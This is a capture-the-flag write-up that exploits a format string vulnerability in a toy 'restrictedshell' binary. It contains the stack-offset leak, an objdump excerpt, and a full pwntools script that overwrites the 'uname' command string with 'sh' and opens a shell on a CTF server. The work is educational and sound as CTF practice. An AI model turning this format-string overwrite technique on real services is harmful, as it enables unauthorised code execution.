When we run the program, we can tell that it is just appears to just be a shell with only a few limited commands. When we look at the code in IDA, we can see that it is simply a C program that can make 3 system calls (“id”, “uname”, “ls”), and it can also change the shell prompt, and exit the code. 


Looking at the code, there is a format string vulnerability when it prints the shell prompt. We can define what that string is, it performs no checks on that data (once it is scanned into memory), and it uses the vulnerable printf function. So it is possible for us to overwrite one of the system calls with “sh”, which is what we will be doing. Soon I will post a more in depth Format Strings write up to my github (if it isn’t already there).


To exploit this we can use a utility from pwntools that will generate the string we need to rewrite one of the system calls with “sh”. It only needs three things for this exploit.

```
Offset: Distance on the stack until you hit the first formatter you control.
Address: The address of the place you want to write to
Value: The value you want to write to
```

To find out the offset, we can try inputting data into the prompt function, and reading places off of the stack until we see the data we inputed. I’m going to start off with just checking the first 10 bytes (doesn’t always work out that way).

```
./restrictedshell
rsh$ prompt
Enter new prompt string: aguy.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
aguy.64.f77345a0.f775e634.0.79756761.2e78252e.252e7825.78252e78.2e78252e.252e782
```

Remember I specified for it to output the hex, and plus it reads it in little Endian (so basically it’s backwards), so we are looking for the hex of “yuga” which is “79756761”. We see that in the fifth instance, so we know that the offset is 5.


Now to find the Address that we are going to write to, we could open it up in ObjDump and search for what value it pushes to the stack right before it calls system, like the example below (The symbol we’re looking for here is 0x8049c74)



```
 80487c0:       75 15                   jne    80487d7 <handle_connection+0xd4>
 80487c2:       83 ec 0c                sub    esp,0xc
 80487c5:       68 74 9c 04 08          push   0x8049c74
 80487ca:       e8 c1 fd ff ff          call   8048590 <system@plt>
 80487cf:       83 c4 10                add    esp,0x10
```



Or we can just have pwntools do all of the work, by specifying the binary and having it retrieve the symbol for that string.

```
elf = ELF("restrictedshell")
context(binary=elf)
print elf.symbols["cmd_uname"]
```

That will print out the address of that string. Now we just need to know the value we want to write over that. 

```
u32(“sh\0\0”)
```

Now that we have the three pieces, we can make the format string. It has to be in the following format.

```
payload = fmtstr_payload(offset, {address: value})
```

So in this case it should be

```
payload = fmtstr_payload(5, {elf.symbols[“cmd_uname”]: u32(“sh\0\0”)})
```

That is the most crucial part of this exploit. Once you have that, writing the rest of the exploit will be easy if you made it this far.

```
#Import pwntools
from pwn import *


#Setup the remot connection
conn = remote("ctf.hackucf.org", 7007)


#This establishes the binary which we will be pulling the symbols from
bin = ELF("restrictedshell")


context(binary=bin)


#This constructs the fromat string payload, and then prints it out
payload = fmtstr_payload(5, {bin.symbols["cmd_uname"]: u32("sh\0\0")})
print payload
 
#This sends "prompt" to the server so we can send exploit the vulnerabillity
conn.sendline("prompt")


#Now we send the payload
conn.sendline(payload)


#Now we just have to run the new uname, so we can get a shell
conn.sendline("uname")


#And now we drop to an interactive shell
conn.interactive()
```


```
python exploit.py
\x00$ ls
flag.txt
restrictedshell
$ cat flag.txt
flag{not_such_a_restrictive_shell_after_all}
```




